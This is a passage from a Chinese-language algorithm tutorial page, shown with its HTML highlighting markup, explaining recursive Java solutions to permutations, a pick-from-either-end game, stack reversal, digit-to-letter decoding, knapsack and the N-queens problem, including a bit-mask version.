punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> tmp <span class="token operator">=</span> chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>    chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>chars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token punctuation">]</span> visit <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">boolean</span><span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>j <span class="token operator">&lt;</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>visit<span class="token punctuation">[</span>chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            visit<span class="token punctuation">[</span>chars<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">process</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> chars<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">swap</span><span class="token punctuation">(</span>chars<span class="token punctuation">,</span> j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="分数最高"><a href="#分数最高" class="headerlink" title="分数最高"></a>分数最高</h3><p>arr=[1,2,100,4], A先拿，B后拿，双方都只能拿最左或最右的值，谁最后最大谁获胜</p><p>先手函数 f() 后手函数 s()</p><p>对于先手函数，base case: 即只剩一个数，当然返回该值</p><p>否则返回max[（拿了左边的+后手操作返回值）,（拿了右边的+后手操作返回值）]</p><p>对于后手函数，base case: 只剩一个数，既然是后手，那么该数当然不是自己拿，而是对方拿，所以返回0</p><p>否则返回min[（去掉左边值然后先手操作）,（去掉右边值然后先手操作）]</p><blockquote><p>为什么是最小值？因为这是后手函数，自己是后手，那么对方一定会选择对他优势更大的，所以留给自己的当然是较小值的情况</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>l<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> arr<span class="token punctuation">[</span>r<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">s</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>l <span class="token operator">==</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> l<span class="token punctuation">,</span> r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">highestScore</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>arr <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> arr<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">s</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> arr<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="递归逆序栈"><a href="#递归逆序栈" class="headerlink" title="递归逆序栈"></a>递归逆序栈</h3><p>不能使用额外数据结构</p><p>函数f: 拿出来栈底的值，其他值按原来顺序放好</p><p>每次弹出栈顶，递归调用直到为空，并且记录每次弹出的值，该值不是最后一个值就再压进去，把最后一个值一层一层往上返回</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">f</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> result <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> result<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> last <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> last<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">reverseStackUsingRecursive</span><span class="token punctuation">(</span><span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> stack<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>stack<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> last <span class="token operator">=</span> <span class="token function">f</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">reverseStackUsingRecursive</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">;</span>    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>last<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="数字转化字母"><a href="#数字转化字母" class="headerlink" title="数字转化字母"></a>数字转化字母</h3><p>1 - A 2-B 3-C … 26个字母皆如此，那么一个字符串”111”可以转化为”AAA”, “KA”, “AK”，则给定一个只有数字字符组成的字符串str，返回有多少种转化结果</p><p>0, …, i-1 位置定好转化目标，然后返回 i, …, length - 1的结果</p><p>检查位置i上的数字，</p><p>如果为0，那么无论如何都没法转化，整个决定错误，返回0</p><p>不为0，则一定可以将该位置转化为对应字母，返回i+1 - length-1的结果</p><p>然后分为该数字为1，2，其他</p><p>1）为1，则还可以跟下一个数字组合成一个两位数，转化为对应字母（如果存在下一个）</p><p>2）为2，并且下一个数字在0-6之间</p><p>3）其他数字，莫得办法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> str<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>length<span class="token punctuation">)</span> res <span class="token operator">+=</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span> <span class="token operator">&lt;</span> str<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token string">'0'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> <span class="token string">'6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> res <span class="token operator">+=</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">convertToLetterString</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>str <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>str<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h3><p>给定两个长度都为N的数组weights和values，weights[i]和values[i]分别代表 i号物品的重量和价值。给定一个正数bag，表示一个载重bag的袋子，你装的物品不能超过这个重量。返回你能装下最多的价值是多少</p><p>依然是从头开始尝试，0, …, i-1 位置定好选择装哪个物品，并记录已装物品的重量，然后返回 i, …, length - 1的结果</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> weights<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values<span class="token punctuation">,</span> <span class="token keyword">int</span> bag<span class="token punctuation">,</span> <span class="token keyword">int</span> alreadyweight<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>alreadyweight <span class="token operator">></span> bag<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> weights<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span><span class="token function">process</span><span class="token punctuation">(</span>weights<span class="token punctuation">,</span> values<span class="token punctuation">,</span> bag<span class="token punctuation">,</span> weights<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> alreadyweight<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token function">process</span><span class="token punctuation">(</span>weights<span class="token punctuation">,</span> values<span class="token punctuation">,</span> bag<span class="token punctuation">,</span> alreadyweight<span class="token punctuation">,</span> i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token class-name">Knapsack</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> weights<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values<span class="token punctuation">,</span> <span class="token keyword">int</span> bag<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>weights <span class="token operator">==</span> <span class="token keyword">null</span><span class="token operator">||</span> values <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> weights<span class="token punctuation">.</span>length <span class="token operator">!=</span> values<span class="token punctuation">.</span>length <span class="token operator">||</span> values<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>weights<span class="token punctuation">,</span> values<span class="token punctuation">,</span> bag<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="N皇后问题"><a href="#N皇后问题" class="headerlink" title="N皇后问题"></a>N皇后问题</h2><p>在N*N的棋盘上要摆N个皇后，要求任何两个皇后不同行、不同列， 也不在同一条斜线上</p><p>给定一个整数n，返回n皇后的摆法有多少种</p><p>n=1，返回1</p><p>n=2或3，2皇后和3皇后问题无论怎么摆都不行，返回0</p><p>n=8，返回92</p><h3 id="1-0"><a href="#1-0" class="headerlink" title="1.0"></a>1.0</h3><p>对N*N棋盘进行深度优先遍历，第一行选一个位置放一个皇后，进入下一行，选一个位置放一个皇后，并且保证与前面放的皇后不重合</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">nQueens</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> records <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> records<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 当前在第i行，records[m] = n 表示第m行的皇后放在第n列</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> records<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// 0到n-1行完成放皇后的操作，说明n*n的棋盘完成摆放，返回1即为1个n皇后的摆法</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>i <span class="token operator">==</span> n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token comment">// 尝试每一列</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isValid</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> k<span class="token punctuation">,</span> records<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            records<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>            res <span class="token operator">+=</span> <span class="token function">process</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> records<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// i行j列放皇后是否合适</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isValid</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> records<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> m<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>m<span class="token operator">&lt;</span>i<span class="token punctuation">;</span>m<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">==</span> j <span class="token operator">||</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>records<span class="token punctuation">[</span>m<span class="token punctuation">]</span> <span class="token operator">-</span> j<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>m <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-0-位运算优化"><a href="#2-0-位运算优化" class="headerlink" title="2.0 位运算优化"></a>2.0 位运算优化</h3><p>假设为8皇后，则设立限制为前32-8位为0，后8位为1 （32是指不能超过32皇后）</p><p>存在三个数字，分别为列限制，左斜线限制，右斜线限制</p><p>从第0行，放在第几列，则把列限制的哪一位置1，然后左斜线限制的该位的左一位置1，右斜线限制的该位的右一位置1，</p><p>假设列限制为    0000 1 000，</p><p>则左斜线限制为0001 0 000，</p><p>右斜线限制为    0000 0 100</p><p>那么第1行，结合已有的三个限制（即或运算），将所有限制结合在一个数上，即为000 111 00，将该数取反然后和初始的限制 32-8 个0 8个1 做与运算，则为32-8 个0 111 000 11，所以1即为可以放皇后的位置，通过每次取得最右侧的1，然后继续递归，将三个限制做处理，然后传递到下一层，首先列限制即为将原先的列限制和取得的最右侧的1做或运算，左斜线限制为将原先的左斜线限制和取得的最右侧的1做或运算，然后左移一位，右斜线限制为将原先的右斜线限制和取得的最右侧的1做或运算，然后右移一位</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">process2</span><span class="token punctuation">(</span><span class="token keyword">int</span> limit<span class="token punctuation">,</span> <span class="token keyword">int</span> colLimit<span class="token punctuation">,</span> <span class="token keyword">int</span> leftDiaLimit<span class="token punctuation">,</span> <span class="token keyword">int</span> rightDiaLimit<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>limit <span class="token operator">==</span> colLimit<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> positions <span class="token operator">=</span> limit <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span>colLimit<span class="token operator">|</span>leftDiaLimit<span class="token operator">|</span>rightDiaLimit<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mostRight<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>positions <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        mostRight <span class="token operator">=</span> positions <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">~</span>positions<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        positions <span class="token operator">=</span> positions <span class="token operator">-</span> mostRight<span class="token punctuation">;</span>        res <span class="token operator">+=</span> <span class="token function">process2</span><span class="token punctuation">(</span>limit<span class="token punctuation">,</span> colLimit<span class="token operator">|</span>mostRight<span class="token punctuation">,</span> <span class="token punctuation">(</span>leftDiaLimit<span class="token operator">|</span>mostRight<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token punctuation">,</span>                <span class="token punctuation">(</span>rightDiaLimit<span class="token operator">|</span>mostRight<span class="token punctuation">)</span><span class="token operator">>>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> res<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">nQueens2</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span> <span class="token operator">||</span> n <span class="token operator">></span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> limit <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">==</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>n<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process2</span><span class="token punctuation">(</span>limit<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 